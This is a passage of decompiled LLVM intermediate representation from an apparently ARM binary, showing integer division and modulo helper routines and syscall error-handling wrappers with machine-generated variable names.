  %v2_b57c = icmp ugt i32 %v5_b584, 3
  %v7_b57c = icmp eq i32 %v5_b584, 4
  %v2_b580 = xor i1 %v7_b57c, true
  %v3_b580 = and i1 %v2_b57c, %v2_b580
  br i1 %v3_b580, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_b580 = add nsw i32 %v4_b580, 3
  store i32 %v5_b580, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_b584 = phi i32 [ %v4_b580, %.thread18 ], [ %v5_b580, %bb101 ]
  %v2_b584 = xor i1 %v2_b57c, true
  %v3_b584 = or i1 %v7_b57c, %v2_b584
  br i1 %v3_b584, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_b584 = udiv i32 %v5_b584, 2
  %v9_b584 = add i32 %v4_b584, %v8_b584
  store i32 %v9_b584, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_b588 = phi i32 [ %v4_b584, %bb102 ], [ %v9_b584, %bb103 ]
  %v6_b588 = lshr i32 %v0_b4b4, %v1_b588
  ret i32 %v6_b588

dec_label_pc_b590:                                ; preds = %dec_label_pc_b4a8
  %v0_b590 = load i32, i32* @lr, align 4
  %v0_b594 = call i32 @function_b700()
  store i32 %v0_b590, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_b584, { 1, 0 }
  uselistorder i1 %v7_b57c, { 1, 0 }
  uselistorder i32 %v4_b574, { 2, 1, 0 }
  uselistorder i32 %v1_b574, { 1, 0, 2, 3 }
  uselistorder i32 %v2_b56c, { 1, 0 }
  uselistorder i32 %v4_b568, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_b568, { 1, 0, 2, 3 }
  uselistorder i32 %v4_b558, { 2, 1, 0 }
  uselistorder i32 %v0_b530, { 1, 0 }
  uselistorder i32 %v4_b524, { 1, 0 }
  uselistorder i32 %v1_b52c, { 1, 2, 0 }
  uselistorder i32 %v4_b518, { 1, 0 }
  uselistorder i32 %v1_b520, { 1, 2, 0 }
  uselistorder i32 %v4_b50c, { 1, 0 }
  uselistorder i32 %v1_b514, { 1, 2, 0 }
  uselistorder i32 %v1_b538, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_b508, { 1, 0 }
  uselistorder i32 %v3_b4f4, { 2, 0, 1 }
  uselistorder i32 %v3_b4f0, { 2, 0, 1 }
  uselistorder i32 %v1_b4f0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_b4f4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_b4e0, { 2, 0, 1 }
  uselistorder i32 %v4_b4dc, { 3, 2, 0, 1 }
  uselistorder i32 %v1_b4e0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_b4e8.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v4_b4c8, { 1, 0 }
  uselistorder i32 %v1_b4b4, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_b4b4, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_b4a8, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_b540, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_b4fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b4e8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_b5a4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b5a4:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_b5a8 = call i32 @function_b4a8()
  ret i32 %v0_b5a8
}

define i32 @function_b5bc() local_unnamed_addr {
dec_label_pc_b5bc:
  %v0_b5bc = load i32, i32* @r1, align 4
  %v1_b5bc = icmp slt i32 %v0_b5bc, 0
  %v2_b5bc = icmp eq i32 %v0_b5bc, 0
  %v0_b5c0 = load i32, i32* @r0, align 4
  %v2_b5c0 = xor i32 %v0_b5c0, %v0_b5bc
  br i1 %v2_b5bc, label %dec_label_pc_b6d4, label %dec_label_pc_b5c8

dec_label_pc_b5c8:                                ; preds = %dec_label_pc_b5bc
  br i1 %v1_b5bc, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_b5c8
  %v2_b5c8 = sub i32 0, %v0_b5bc
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_b5c8, %bb
  %v1_b694 = phi i32 [ %v2_b5c8, %bb ], [ %v0_b5bc, %dec_label_pc_b5c8 ]
  %v1_b5cc = add i32 %v1_b694, -1
  %v7_b5cc = icmp eq i32 %v1_b694, 1
  br i1 %v7_b5cc, label %dec_label_pc_b674, label %dec_label_pc_b5d4

dec_label_pc_b5d4:                                ; preds = %thread-pre-split
  %v1_b5d4 = icmp slt i32 %v0_b5c0, 0
  br i1 %v1_b5d4, label %bb84, label %bb85

bb84:                                             ; preds = %dec_label_pc_b5d4
  %v2_b5d8 = sub i32 0, %v0_b5c0
  br label %bb85

bb85:                                             ; preds = %dec_label_pc_b5d4, %bb84
  %v0_b6c8 = phi i32 [ %v0_b5c0, %dec_label_pc_b5d4 ], [ %v2_b5d8, %bb84 ]
  %v3_b5dc = icmp uge i32 %v0_b6c8, %v1_b694
  %v9_b5dc = icmp eq i32 %v0_b6c8, %v1_b694
  %v2_b5e0 = xor i1 %v3_b5dc, true
  %v3_b5e0 = or i1 %v9_b5dc, %v2_b5e0
  br i1 %v3_b5e0, label %dec_label_pc_b680, label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %bb85
  %v2_b5e4 = and i32 %v1_b5cc, %v1_b694
  %v4_b5e4 = icmp eq i32 %v2_b5e4, 0
  br i1 %v4_b5e4, label %dec_label_pc_b690, label %dec_label_pc_b5ec

dec_label_pc_b5ec:                                ; preds = %dec_label_pc_b5e4
  %v3_b5ec = icmp ult i32 %v1_b694, 536870912
  br i1 %v3_b5ec, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_b5ec
  %v4_b5f0 = mul i32 %v1_b694, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_b5ec, %.thread
  %v0_b610.pr40.ph = phi i32 [ %v4_b5f0, %.thread ], [ %v1_b694, %dec_label_pc_b5ec ]
  %storemerge142 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_b5ec ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb88
  %v0_b610.pr40 = phi i32 [ %v4_b604, %bb88 ], [ %v0_b610.pr40.ph, %.preheader.preheader ]
  %v1_b608 = phi i32 [ %v4_b608, %bb88 ], [ %storemerge142, %.preheader.preheader ]
  %v2_b5fc = icmp ugt i32 %v0_b610.pr40, 268435455
  br i1 %v2_b5fc, label %.thread3, label %bb86

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_b610thread-pre-split.loopexit

bb86:                                             ; preds = %.preheader
  %v4_b600 = icmp ult i32 %v0_b610.pr40, %v0_b6c8
  br i1 %v4_b600, label %bb87, label %dec_label_pc_b610thread-pre-split.loopexit.loopexit

bb87:                                             ; preds = %bb86
  %v2_b604 = and i32 %v0_b610.pr40, 268435456
  %v3_b604 = icmp eq i32 %v2_b604, 0
  %v4_b604 = mul i32 %v0_b610.pr40, 16
  br i1 %v3_b604, label %bb88, label %dec_label_pc_b610.loopexit

bb88:                                             ; preds = %bb87
  %v2_b608 = and i32 %v1_b608, 268435456
  %v3_b608 = icmp eq i32 %v2_b608, 0
  %v4_b608 = mul i32 %v1_b608, 16
  br i1 %v3_b608, label %.preheader, label %dec_label_pc_b610thread-pre-split.loopexit.loopexit

dec_label_pc_b610thread-pre-split.loopexit.loopexit: ; preds = %bb88, %bb86
  %v1_b61c52.ph = phi i32 [ %v1_b608, %bb86 ], [ %v4_b608, %bb88 ]
  %v0_b610.pr42.ph = phi i32 [ %v0_b610.pr40, %bb86 ], [ %v4_b604, %bb88 ]
  br label %dec_label_pc_b610thread-pre-split.loopexit

dec_label_pc_b610thread-pre-split.loopexit:       ; preds = %dec_label_pc_b610thread-pre-split.loopexit.loopexit, %.thread3
  %v1_b61c52 = phi i32 [ %v1_b608, %.thread3 ], [ %v1_b61c52.ph, %dec_label_pc_b610thread-pre-split.loopexit.loopexit ]
  %v0_b610.pr42 = phi i32 [ %v0_b610.pr40, %.thread3 ], [ %v0_b610.pr42.ph, %dec_label_pc_b610thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_b610thread-pre-split

dec_label_pc_b610thread-pre-split:                ; preds = %dec_label_pc_b610thread-pre-split.loopexit, %bb90
  %v1_b61c50 = phi i32 [ %v1_b61c52, %dec_label_pc_b610thread-pre-split.loopexit ], [ %v3_b61c, %bb90 ]
  %v2_b61448 = phi i32 [ %v0_b6c8, %dec_label_pc_b610thread-pre-split.loopexit ], [ %v2_b614, %bb90 ]
  %v0_b610.pr = phi i32 [ %v0_b610.pr42, %dec_label_pc_b610thread-pre-split.loopexit ], [ %v3_b618, %bb90 ]
  br label %dec_label_pc_b610

dec_label_pc_b610.loopexit:                       ; preds = %bb87
  br label %dec_label_pc_b610

dec_label_pc_b610:                                ; preds = %dec_label_pc_b610.loopexit, %dec_label_pc_b610thread-pre-split
  %v1_b61c = phi i32 [ %v1_b61c50, %dec_label_pc_b610thread-pre-split ], [ %v1_b608, %dec_label_pc_b610.loopexit ]
  %v2_b614 = phi i32 [ %v2_b61448, %dec_label_pc_b610thread-pre-split ], [ %v0_b6c8, %dec_label_pc_b610.loopexit ]
  %v1_b618 = phi i32 [ %v0_b610.pr, %dec_label_pc_b610thread-pre-split ], [ %v4_b604, %dec_label_pc_b610.loopexit ]
  %v2_b610 = icmp slt i32 %v1_b618, 0
  br i1 %v2_b610, label %dec_label_pc_b624, label %bb89

bb89:                                             ; preds = %dec_label_pc_b610
  %v4_b614 = icmp ult i32 %v1_b618, %v2_b614
  br i1 %v4_b614, label %bb90, label %dec_label_pc_b624

bb90:                                             ; preds = %bb89
  %v3_b618 = mul i32 %v1_b618, 2
  %v2_b61c = icmp slt i32 %v1_b61c, 0
  %v3_b61c = mul i32 %v1_b61c, 2
  br i1 %v2_b61c, label %dec_label_pc_b624, label %dec_label_pc_b610thread-pre-split

dec_label_pc_b624:                                ; preds = %bb89, %dec_label_pc_b610, %bb90
  %v2_b63063 = phi i32 [ %v3_b61c, %bb90 ], [ %v1_b61c, %bb89 ], [ %v1_b61c, %dec_label_pc_b610 ]
  %v1_b62855 = phi i32 [ %v3_b618, %bb90 ], [ %v1_b618, %bb89 ], [ %v1_b618, %dec_label_pc_b610 ]
  br label %dec_label_pc_b628

dec_label_pc_b628:                                ; preds = %.thread13, %dec_label_pc_b624
  %v1_b65c = phi i32 [ %v4_b65c, %.thread13 ], [ %v2_b63063, %dec_label_pc_b624 ]
  %v1_b630 = phi i32 [ %v1_b66c, %.thread13 ], [ 0, %dec_label_pc_b624 ]
  %v1_b660 = phi i32 [ %v4_b660, %.thread13 ], [ %v1_b62855, %dec_label_pc_b624 ]
  %v1_b62c = phi i32 [ %v0_b658, %.thread13 ], [ %v0_b6c8, %dec_label_pc_b624 ]
  %v3_b628 = icmp ult i32 %v1_b62c, %v1_b660
  br i1 %v3_b628, label %.thread8, label %bb91

bb91:                                             ; preds = %dec_label_pc_b628
  %v3_b62c = sub i32 %v1_b62c, %v1_b660
  %v3_b630 = or i32 %v1_b630, %v1_b65c
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_b628, %bb91
  %v1_b638 = phi i32 [ %v1_b62c, %dec_label_pc_b628 ], [ %v3_b62c, %bb91 ]
  %v1_b63c = phi i32 [ %v1_b630, %dec_label_pc_b628 ], [ %v3_b630, %bb91 ]
  %v4_b634 = udiv i32 %v1_b660, 2
  %v6_b634 = icmp ult i32 %v1_b638, %v4_b634
  br i1 %v6_b634, label %.thread9, label %bb92

bb92:                                             ; preds = %.thread8
  %v3_b638 = urem i32 %v1_b660, 2
  %v4_b638 = icmp eq i32 %v3_b638, 0
  %v6_b638 = sub i32 %v1_b638, %v4_b634
  br i1 %v4_b638, label %.thread9, label %bb93

bb93:                                             ; preds = %bb92
  %v5_b63c = udiv i32 %v1_b65c, 2
  %v6_b63c = or i32 %v1_b63c, %v5_b63c
  br label %.thread9

.thread9:                                         ; preds = %bb92, %.thread8, %bb93
  %v1_b644 = phi i32 [ %v6_b638, %bb92 ], [ %v1_b638, %.thread8 ], [ %v6_b638, %bb93 ]
  %v1_b648 = phi i32 [ %v1_b63c, %bb92 ], [ %v1_b63c, %.thread8 ], [ %v6_b63c, %bb93 ]
  %v4_b640 = udiv i32 %v1_b660, 4
  %v6_b640 = icmp ult i32 %v1_b644, %v4_b640
  br i1 %v6_b640, label %.thread10, label %bb94

bb94:                                             ; preds = %.thread9
  %v3_b644 = and i32 %v1_b660, 2
  %v4_b644 = icmp eq i32 %v3_b644, 0
  %v6_b644 = sub i32 %v1_b644, %v4_b640
  br i1 %v4_b644, label %.thread10, label %bb95

bb95:                                             ; preds = %bb94
  %v5_b648 = udiv i32 %v1_b65c, 4
  %v6_b648 = or i32 %v1_b648, %v5_b648
  br label %.thread10

.thread10:                                        ; preds = %bb94, %.thread9, %bb95
  %v1_b650 = phi i32 [ %v6_b644, %bb94 ], [ %v1_b644, %.thread9 ], [ %v6_b644, %bb95 ]
  %v1_b654 = phi i32 [ %v1_b648, %bb94 ], [ %v1_b648, %.thread9 ], [ %v6_b648, %bb95 ]
  %v4_b64c = udiv i32 %v1_b660, 8
  %v6_b64c = icmp ult i32 %v1_b650, %v4_b64c
  br i1 %v6_b64c, label %thread-pre-split12, label %bb96

bb96:                                             ; preds = %.thread10
  %v3_b650 = and i32 %v1_b660, 4
  %v4_b650 = icmp eq i32 %v3_b650, 0
  %v6_b650 = sub i32 %v1_b650, %v4_b64c
  br i1 %v4_b650, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %bb96
  %v5_b654 = udiv i32 %v1_b65c, 8
  %v6_b654 = or i32 %v1_b654, %v5_b654
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb97, %.thread10, %bb96
  %v1_b66c = phi i32 [ %v1_b654, %bb96 ], [ %v1_b654, %.thread10 ], [ %v6_b654, %bb97 ]
  %v0_b658 = phi i32 [ %v6_b650, %bb96 ], [ %v1_b650, %.thread10 ], [ %v6_b650, %bb97 ]
  %v2_b658 = icmp eq i32 %v0_b658, 0
  br i1 %v2_b658, label %dec_label_pc_b668, label %bb98

bb98:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_b65c, 16
  br i1 %tmp, label %dec_label_pc_b668, label %.thread13

.thread13:                                        ; preds = %bb98
  %v4_b65c = udiv i32 %v1_b65c, 16
  %v4_b660 = udiv i32 %v1_b660, 16
  br label %dec_label_pc_b628

dec_label_pc_b668:                                ; preds = %thread-pre-split12, %bb98
  %v1_b668 = icmp slt i32 %v2_b5c0, 0
  br i1 %v1_b668, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_b668
  %v2_b66c = sub i32 0, %v1_b66c
  br label %.thread16

.thread16:                                        ; preds = %bb103, %bb102, %bb100, %dec_label_pc_b674, %dec_label_pc_b668, %bb99
  %v1_b670 = phi i32 [ %v1_b66c, %dec_label_pc_b668 ], [ %v2_b66c, %bb99 ], [ %v2_b678, %bb100 ], [ undef, %dec_label_pc_b674 ], [ %v1_b68c80, %bb102 ], [ %v2_b688, %bb103 ]
  ret i32 %v1_b670

dec_label_pc_b674:                                ; preds = %thread-pre-split
  br i1 %v1_b5bc, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_b674
  %v2_b678 = sub i32 0, %v0_b5c0
  br label %.thread16

dec_label_pc_b680:                                ; preds = %bb85
  br i1 %v3_b5dc, label %bb102, label %bb101

bb101:                                            ; preds = %dec_label_pc_b680
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_b680, %bb101
  %v1_b68c80 = phi i32 [ %v0_b5c0, %dec_label_pc_b680 ], [ 0, %bb101 ]
  br i1 %v9_b5dc, label %bb103, label %.thread16

bb103:                                            ; preds = %bb102
  %v4_b684 = ashr i32 %v2_b5c0, 31
  %v2_b688 = or i32 %v4_b684, 1
  br label %.thread16

dec_label_pc_b690:                                ; preds = %dec_label_pc_b5e4
  %v2_b690 = icmp ugt i32 %v1_b694, 65535
  br i1 %v2_b690, label %bb104, label %.thread19

bb104:                                            ; preds = %dec_label_pc_b690
  %v2_b694 = and i32 %v1_b694, 32768
  %v3_b694 = icmp eq i32 %v2_b694, 0
  %v4_b694 = udiv i32 %v1_b694, 65536
  br i1 %v3_b694, label %.thread19, label %bb105

.thread19:                                        ; preds = %bb104, %dec_label_pc_b690
  %v0_b6a070 = phi i32 [ %v1_b694, %dec_label_pc_b690 ], [ %v4_b694, %bb104 ]
  br label %bb105

bb105:                                            ; preds = %bb104, %.thread19
  %v1_b6a4 = phi i32 [ %v0_b6a070, %.thread19 ], [ %v4_b694, %bb104 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb104 ]
  %v2_b6a0 = icmp ugt i32 %v1_b6a4, 255
  br i1 %v2_b6a0, label %bb106, label %.thread20

bb106:                                            ; preds = %bb105
  %v2_b6a4 = and i32 %v1_b6a4, 128
  %v3_b6a4 = icmp eq i32 %v2_b6a4, 0
  %v4_b6a4 = udiv i32 %v1_b6a4, 256
  br i1 %v3_b6a4, label %.thread20, label %bb107

bb107:                                            ; preds = %bb106
  %v2_b6a8 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb106, %bb105, %bb107
  %v1_b6b4 = phi i32 [ %storemerge, %bb105 ], [ %storemerge, %bb106 ], [ %v2_b6a8, %bb107 ]
  %v1_b6b0 = phi i32 [ %v1_b6a4, %bb105 ], [ %v4_b6a4, %bb106 ], [ %v4_b6a4, %bb107 ]
  %v2_b6ac = icmp ugt i32 %v1_b6b0, 15
  br i1 %v2_b6ac, label %bb108, label %.thread21

bb108:                                            ; preds = %.thread20
  %v2_b6b0 = and i32 %v1_b6b0, 8
  %v3_b6b0 = icmp eq i32 %v2_b6b0, 0
  %v4_b6b0 = udiv i32 %v1_b6b0, 16
  br i1 %v3_b6b0, label %.thread21, label %bb109

bb109:                                            ; preds = %bb108
  %v2_b6b4 = add nsw i32 %v1_b6b4, 4
  br label %.thread21

.thread21:                                        ; preds = %bb108, %.thread20, %bb109
  %v4_b6bc = phi i32 [ %v1_b6b4, %.thread20 ], [ %v1_b6b4, %bb108 ], [ %v2_b6b4, %bb109 ]
  %v5_b6c0 = phi i32 [ %v1_b6b0, %.thread20 ], [ %v4_b6b0, %bb108 ], [ %v4_b6b0, %bb109 ]
  %v2_b6b8 = icmp ugt i32 %v5_b6c0, 3
  %v7_b6b8 = icmp eq i32 %v5_b6c0, 4
  %v2_b6bc = xor i1 %v7_b6b8, true
  %v3_b6bc = and i1 %v2_b6b8, %v2_b6bc
  br i1 %v3_b6bc, label %bb110, label %bb111

bb110:                                            ; preds = %.thread21
  %v5_b6bc = add nsw i32 %v4_b6bc, 3
  br label %bb111

bb111:                                            ; preds = %.thread21, %bb110
  %v4_b6c0 = phi i32 [ %v4_b6bc, %.thread21 ], [ %v5_b6bc, %bb110 ]
  %v2_b6c0 = xor i1 %v2_b6b8, true
  %v3_b6c0 = or i1 %v7_b6b8, %v2_b6c0
  br i1 %v3_b6c0, label %bb112, label %bb113

bb112:                                            ; preds = %bb111
  %v8_b6c0 = udiv i32 %v5_b6c0, 2
  %v9_b6c0 = add i32 %v4_b6c0, %v8_b6c0
  br label %bb113

bb113:                                            ; preds = %bb111, %bb112
  %v1_b6c8 = phi i32 [ %v4_b6c0, %bb111 ], [ %v9_b6c0, %bb112 ]
  %v1_b6c4 = icmp slt i32 %v2_b5c0, 0
  %v6_b6c8 = lshr i32 %v0_b6c8, %v1_b6c8
  %v2_b6cc = sub i32 0, %v6_b6c8
  %v2_b6cc.v6_b6c8 = select i1 %v1_b6c4, i32 %v2_b6cc, i32 %v6_b6c8
  ret i32 %v2_b6cc.v6_b6c8

dec_label_pc_b6d4:                                ; preds = %dec_label_pc_b5bc
  %v0_b6d8 = call i32 @function_b700()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_b6c0, { 1, 0 }
  uselistorder i1 %v7_b6b8, { 1, 0 }
  uselistorder i32 %v4_b6b0, { 1, 0 }
  uselistorder i32 %v1_b6b0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_b6a4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_b6a4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_b694, { 1, 0 }
  uselistorder i32 %v0_b658, { 1, 0 }
  uselistorder i32 %v4_b64c, { 1, 0 }
  uselistorder i32 %v1_b654, { 1, 2, 0 }
  uselistorder i32 %v4_b640, { 1, 0 }
  uselistorder i32 %v1_b648, { 1, 2, 0 }
  uselistorder i32 %v4_b634, { 1, 0 }
  uselistorder i32 %v1_b63c, { 1, 2, 0 }
  uselistorder i32 %v1_b660, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_b630, { 1, 0 }
  uselistorder i32 %v1_b65c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_b61c, { 1, 0 }
  uselistorder i32 %v3_b618, { 1, 0 }
  uselistorder i32 %v1_b618, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_b614, { 1, 0 }
  uselistorder i32 %v1_b61c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_b608, { 1, 0 }
  uselistorder i32 %v4_b604, { 2, 1, 0 }
  uselistorder i32 %v1_b608, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_b610.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_b5dc, { 1, 0 }
  uselistorder i32 %v1_b694, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_b5c0, { 1, 0, 2 }
  uselistorder i32 %v0_b5c0, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %v0_b5bc, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @function_b700, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %bb111, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_b668, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_b624, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b610thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_b6e8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_b6e8:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_b6ec = call i32 @function_b5bc()
  %v2_b6f4 = mul i32 %v0_b6ec, %arg2
  %v2_b6f8 = sub i32 %arg1, %v2_b6f4
  store i32 %v2_b6f8, i32* @r1, align 4
  ret i32 %v0_b6ec

; uselistorder directives
  uselistorder i32 %v0_b6ec, { 1, 0 }
}

define i32 @function_b700() local_unnamed_addr {
dec_label_pc_b700:
  %v1_b708 = call i32 @function_e4dc(i32 8)
  ret i32 %v1_b708
}

define i32 @function_b714(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b714:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_b724 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_b724, 2
  br i1 %tmp, label %dec_label_pc_b760, label %dec_label_pc_b73c

dec_label_pc_b73c:                                ; preds = %dec_label_pc_b714
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_b794, label %dec_label_pc_b750

dec_label_pc_b750:                                ; preds = %dec_label_pc_b73c
  %v0_b754 = call i32 @function_f150()
  br label %dec_label_pc_b788

dec_label_pc_b760:                                ; preds = %dec_label_pc_b714
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_b77c, label %dec_label_pc_b794

dec_label_pc_b77c:                                ; preds = %dec_label_pc_b760
  %v0_b780 = call i32 @function_f150()
  br label %dec_label_pc_b788

dec_label_pc_b788:                                ; preds = %dec_label_pc_b750, %dec_label_pc_b77c
  %storemerge2 = phi i32 [ %v0_b754, %dec_label_pc_b750 ], [ %v0_b780, %dec_label_pc_b77c ]
  %storemerge.in = load i16, i16* @global_var_1d2d8.209, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_b788 = load i32, i32* %r2.global-to-local, align 4
  %v1_b788 = sub i32 0, %v0_b788
  store i32 %v1_b788, i32* %r2.global-to-local, align 4
  %v3_b78c = add i32 %storemerge, %storemerge2
  %v4_b78c = inttoptr i32 %v3_b78c to i32*
  store i32 %v1_b788, i32* %v4_b78c, align 4
  br label %dec_label_pc_b794

dec_label_pc_b794:                                ; preds = %dec_label_pc_b73c, %dec_label_pc_b760, %dec_label_pc_b788
  %storemerge1 = phi i32 [ -1, %dec_label_pc_b788 ], [ %arg1, %dec_label_pc_b760 ], [ %arg1, %dec_label_pc_b73c ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_b794, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b788, { 1, 0 }
}

define i32 @function_b7ac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b7ac:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_b7ac = load i32, i32* @r2, align 4
  %v9_b7ac = load i32, i32* @r3, align 4
  store i32 %v9_b7ac, i32* %stack_var_-4, align 4
  %v3_b7b0 = load i32, i32* @r4, align 4
  store i32 %v3_b7b0, i32* %stack_var_-32, align 4
  %v6_b7b0 = load i32, i32* @r5, align 4
  %v12_b7b0 = load i32, i32* @r7, align 4
  %v4_b7c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 12468) to i32*), align 4
  %v2_b7c8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b7c8, i32* @r3, align 4
  %v2_b7cc = icmp eq i32 %v4_b7c0, 0
  %v0_b7d4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b7d4, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_b7ac, i32* @r4, align 4
  br i1 %v2_b7cc, label %dec_label_pc_b7f0, label %dec_label_pc_b7e4

dec_label_pc_b7e4:                                ; preds = %dec_label_pc_b7ac
  %v7_b7e4 = icmp eq i32 %arg2, 7
  br i1 %v7_b7e4, label %dec_label_pc_b830, label %bb

bb:                                               ; preds = %dec_label_pc_b7e4
  %v8_b7e8 = icmp eq i32 %arg2, 14
  br i1 %v8_b7e8, label %dec_label_pc_b830, label %dec_label_pc_b7f0

dec_label_pc_b7f0:                                ; preds = %bb, %dec_label_pc_b7ac
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_b7d4, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_b7d4, -4095
  br i1 %tmp, label %dec_label_pc_b828, label %dec_label_pc_b810

dec_label_pc_b810:                                ; preds = %dec_label_pc_b7f0
  %v0_b814 = call i32 @function_f150()
  %v3_b818 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_b818 = sext i16 %v3_b818 to i32
  store i32 %v4_b818, i32* @r3, align 4
  %v0_b81c = load i32, i32* @r2, align 4
  %v1_b81c = sub i32 0, %v0_b81c
  store i32 %v1_b81c, i32* @r2, align 4
  %v3_b820 = add i32 %v4_b818, %v0_b814
  %v4_b820 = inttoptr i32 %v3_b820 to i32*
  store i32 %v1_b81c, i32* %v4_b820, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b828

dec_label_pc_b828:                                ; preds = %dec_label_pc_b7f0, %dec_label_pc_b810
  %v0_b828 = phi i32 [ %v0_b7d4, %dec_label_pc_b7f0 ], [ -1, %dec_label_pc_b810 ]
